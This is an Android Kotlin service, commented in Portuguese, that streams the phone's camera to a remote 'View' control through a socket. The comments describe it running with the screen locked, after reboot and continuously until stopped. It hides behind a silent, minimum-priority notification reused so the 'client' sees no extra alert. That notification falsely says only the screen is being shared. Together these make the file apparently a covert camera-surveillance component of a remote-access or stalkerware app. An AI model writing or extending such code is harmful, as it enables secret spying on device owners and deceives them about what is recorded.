package com.example.acessomaterno

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat

/**
 * CameraService — foreground service DEDICADO à câmera do botão "View" do
 * emulador nativo. Existe por um único motivo: no Android 14+ (API 34) usar a
 * Camera2 com o app em SEGUNDO PLANO ou com o aparelho BLOQUEADO exige um
 * foreground service com o tipo `camera` ATIVO. O ScreenCaptureService roda com
 * o tipo `mediaProjection` (espelhamento) — não cobre a câmera. Este serviço
 * sobe com `FOREGROUND_SERVICE_TYPE_CAMERA`, então o View funciona:
 *   • com a tela bloqueada e na tela dos 9 pontos (padrão de desbloqueio);
 *   • depois de reiniciar o aparelho (o socket é reerguido pelo ecossistema);
 *   • em tempo real e de forma contínua ("servidor infinito") até mandar parar.
 *
 * NÃO mexe no espelhamento nem no FPS: toda a lógica da câmera continua no
 * CameraStreamer; este serviço só garante o CONTEXTO de foreground correto e o
 * ciclo de vida (liga no View, desliga ao fechar a janela).
 */
class CameraService : Service() {

    companion object {
        private const val TAG = "CameraService"
        private const val NOTIFICATION_ID = 1002
        // Reaproveita o mesmo canal silencioso do ScreenCaptureService para não
        // criar uma segunda "notificação" visível ao cliente.
        private const val CHANNEL_ID = "ScreenCaptureChannelSilent"

        const val ACTION_START = "com.example.acessomaterno.CAMERA_START"
        const val ACTION_STOP = "com.example.acessomaterno.CAMERA_STOP"
        const val ACTION_TROCAR = "com.example.acessomaterno.CAMERA_TROCAR"
        const val EXTRA_FRONTAL = "frontal"

        /** Liga a câmera (View) num foreground service de tipo camera. */
        fun iniciar(ctx: Context, frontal: Boolean) {
            val i = Intent(ctx, CameraService::class.java).apply {
                action = ACTION_START
                putExtra(EXTRA_FRONTAL, frontal)
            }
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    ctx.startForegroundService(i)
                } else {
                    ctx.startService(i)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Falha ao iniciar CameraService: ${e.message}")
            }
        }

        fun trocar(ctx: Context) {
            val i = Intent(ctx, CameraService::class.java).apply { action = ACTION_TROCAR }
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ctx.startForegroundService(i)
                else ctx.startService(i)
            } catch (e: Exception) {
                Log.e(TAG, "Falha ao trocar câmera: ${e.message}")
            }
        }

        fun parar(ctx: Context) {
            val i = Intent(ctx, CameraService::class.java).apply { action = ACTION_STOP }
            try { ctx.startService(i) } catch (_: Exception) {
                try { ctx.stopService(Intent(ctx, CameraService::class.java)) } catch (_: Exception) {}
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun temPermissaoCamera(): Boolean =
        checkSelfPermission(android.Manifest.permission.CAMERA) ==
            PackageManager.PERMISSION_GRANTED

    private fun subirForeground() {
        val notif = criarNotificacao()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIFICATION_ID, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
            } else {
                startForeground(NOTIFICATION_ID, notif)
            }
        } catch (e: Exception) {
            // Se por algum motivo o tipo camera for recusado, tenta sem tipo para
            // ao menos não derrubar o processo.
            Log.e(TAG, "startForeground(camera) falhou: ${e.message}")
            try { startForeground(NOTIFICATION_ID, notif) } catch (_: Exception) {}
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val acao = intent?.action
        if (acao == ACTION_STOP) {
            try { CameraStreamer.parar() } catch (_: Exception) {}
            pararServico()
            return START_NOT_STICKY
        }

        if (!temPermissaoCamera()) {
            SocketManager.emitLogPublico("[CAMERA] IGNORADO: permissão de câmera não concedida.")
            pararServico()
            return START_NOT_STICKY
        }

        // Precisa estar em foreground (tipo camera) ANTES de abrir a Camera2,
        // senão o Android bloqueia a câmera com o app em background/bloqueado.
        subirForeground()

        when (acao) {
            ACTION_TROCAR -> {
                try { CameraStreamer.trocar(applicationContext) } catch (e: Exception) {
                    Log.e(TAG, "Erro ao trocar câmera: ${e.message}")
                }
            }
            else -> {
                val frontal = intent?.getBooleanExtra(EXTRA_FRONTAL, true) ?: true
                try { CameraStreamer.iniciar(applicationContext, frontal) } catch (e: Exception) {
                    Log.e(TAG, "Erro ao iniciar câmera: ${e.message}")
                }
            }
        }
        // START_STICKY: se o sistema matar, recria o serviço (câmera "infinita"
        // enquanto o View estiver aberto; o parar explícito encerra de verdade).
        return START_STICKY
    }

    private fun pararServico() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                stopForeground(STOP_FOREGROUND_REMOVE)
            } else {
                @Suppress("DEPRECATION") stopForeground(true)
            }
        } catch (_: Exception) {}
        try { stopSelf() } catch (_: Exception) {}
    }

    override fun onDestroy() {
        try { CameraStreamer.parar() } catch (_: Exception) {}
        super.onDestroy()
    }

    private fun criarNotificacao(): Notification {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Sessão de Suporte Ativa",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                setShowBadge(false)
                enableVibration(false)
                enableLights(false)
                setSound(null, null)
            }
            getSystemService(NotificationManager::class.java)?.createNotificationChannel(channel)
        }
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Sessão de suporte ativa")
            .setContentText("Sua tela está sendo compartilhada.")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .build()
    }
}
